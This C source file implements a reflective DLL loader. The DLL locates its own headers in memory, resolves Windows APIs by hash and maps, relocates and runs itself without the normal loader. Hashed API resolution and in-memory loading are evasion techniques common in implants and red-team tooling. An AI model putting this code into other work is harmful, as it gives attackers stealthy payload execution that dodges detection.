#include "Utils.h"

extern __declspec(dllexport) BOOLEAN ReflectiveLoader()
{

	PIMAGE_TLS_DIRECTORY TlsDir								= NULL;
	PIMAGE_TLS_CALLBACK* TlsCallback						= NULL;
	Win32				 ReflectiveLoaderApi				= { 0 };
	fnDllMain			 DllMain							= NULL;
	ULONG_PTR			 CurrentAddress						= 0;
	ULONG_PTR			 HeaderValue						= 0;
	PVOID				 ReflectiveLoaderBaseAddress		= NULL;
	PVOID				 ImageBase							= NULL;
	PVOID				 EntryPoint							= NULL;
	DWORD_PTR			 Delta								= 0;
	DWORD				 RelocRVA							= 0;
	DWORD				 TlsRva								= 0;

	CurrentAddress = U_PTR(ReflectiveLoader);

	while (TRUE)
	{
		if (((PIMAGE_DOS_HEADER)CurrentAddress)->e_magic == IMAGE_DOS_SIGNATURE)
		{
			HeaderValue = ((PIMAGE_DOS_HEADER)CurrentAddress)->e_lfanew;
			if (HeaderValue >= sizeof(IMAGE_DOS_HEADER) && HeaderValue < 1024)
			{
				HeaderValue += CurrentAddress;
				if (((PIMAGE_NT_HEADERS)HeaderValue)->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}
		CurrentAddress--;
	}

	ReflectiveLoaderBaseAddress = (PVOID)CurrentAddress;

	ReflectiveLoaderApi.PeHeaders.pImgNtHdrs			 = (PIMAGE_NT_HEADERS64)(U_PTR(ReflectiveLoaderBaseAddress) + ((PIMAGE_DOS_HEADER)ReflectiveLoaderBaseAddress)->e_lfanew);

	ReflectiveLoaderApi.PeHeaders.pImgSecHdr			 = IMAGE_FIRST_SECTION(ReflectiveLoaderApi.PeHeaders.pImgNtHdrs);
	ReflectiveLoaderApi.PeHeaders.pEntryImportDataDir	 = &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	ReflectiveLoaderApi.PeHeaders.pEntryExportDataDir	 = &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	ReflectiveLoaderApi.PeHeaders.pEntryBaseRelocDataDir = &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	ReflectiveLoaderApi.PeHeaders.pEntryExceptionDataDir = &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	ReflectiveLoaderApi.PeHeaders.pEntryTLSDataDir		 = &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	ReflectiveLoaderApi.DllModule.Kernel32				 = LoadDllModule(kernel32_dll_HASH);
	ReflectiveLoaderApi.DllModule.Ntdll					 = LoadDllModule(ntdll_dll_HASH);

	ReflectiveLoaderApi.Api.pVirtualAlloc				 = ResolveHashedFunction(&ReflectiveLoaderApi, ReflectiveLoaderApi.DllModule.Kernel32, VirtualAlloc_HASH);
	ReflectiveLoaderApi.Api.pVirtualProtect				 = ResolveHashedFunction(&ReflectiveLoaderApi, ReflectiveLoaderApi.DllModule.Kernel32, VirtualProtect_HASH);
	ReflectiveLoaderApi.Api.pLoadLibraryA				 = ResolveHashedFunction(&ReflectiveLoaderApi, ReflectiveLoaderApi.DllModule.Kernel32, LoadLibraryA_HASH);
	ReflectiveLoaderApi.Api.pNtFlushInstructionCache	 = ResolveHashedFunction(&ReflectiveLoaderApi, ReflectiveLoaderApi.DllModule.Ntdll, NtFlushInstructionCache_HASH);

	if (!(ImageBase = ReflectiveLoaderApi.Api.pVirtualAlloc(NULL, ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.SizeOfImage, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || ImageBase == NULL)
		return FALSE;

	for (DWORD i = 0; i < ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->FileHeader.NumberOfSections; i++)
	{

		if (ReflectiveLoaderApi.PeHeaders.pImgSecHdr[i].SizeOfRawData == 0)
			continue;

		__movsb
		(
			(PUCHAR)(U_PTR(ImageBase) + ReflectiveLoaderApi.PeHeaders.pImgSecHdr[i].VirtualAddress),
			(PUCHAR)(U_PTR(ReflectiveLoaderBaseAddress) + ReflectiveLoaderApi.PeHeaders.pImgSecHdr[i].PointerToRawData),
			ReflectiveLoaderApi.PeHeaders.pImgSecHdr[i].SizeOfRawData
		);

	}

	Delta		= (U_PTR(ImageBase) - ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.ImageBase);
	RelocRVA	= ReflectiveLoaderApi.PeHeaders.pEntryBaseRelocDataDir->VirtualAddress;

	if (!ResolveIAT(ImageBase, ReflectiveLoaderApi.PeHeaders.pEntryImportDataDir, &ReflectiveLoaderApi))
		return FALSE;

	if (!RelocSections(RelocRVA, ImageBase, Delta))
		return FALSE;

	if (!ChangeMemoryProtection(ImageBase, ReflectiveLoaderApi.PeHeaders.pImgNtHdrs, &ReflectiveLoaderApi))
		return FALSE;

	TlsRva = ReflectiveLoaderApi.PeHeaders.pEntryTLSDataDir->VirtualAddress;
	if (TlsRva != 0)
	{

		TlsDir = (PIMAGE_TLS_DIRECTORY)(U_PTR(ImageBase) + TlsRva);
		TlsCallback = (PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

		if (TlsCallback)
		{

			while (*TlsCallback != NULL)
			{

				(*TlsCallback)((LPVOID)ImageBase, DLL_PROCESS_ATTACH, NULL);
				TlsCallback++;

			}

		}

	}

	if (!NT_SUCCESS(ReflectiveLoaderApi.Api.pNtFlushInstructionCache(NtCurrentProcess(), NULL, 0)))
		return FALSE;

	EntryPoint = C_PTR((U_PTR(ImageBase) + ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));
	if (!EntryPoint)
		return FALSE;

	DllMain = (fnDllMain)EntryPoint;
	DllMain((HINSTANCE)ImageBase, DLL_PROCESS_ATTACH, NULL);

	return TRUE;

}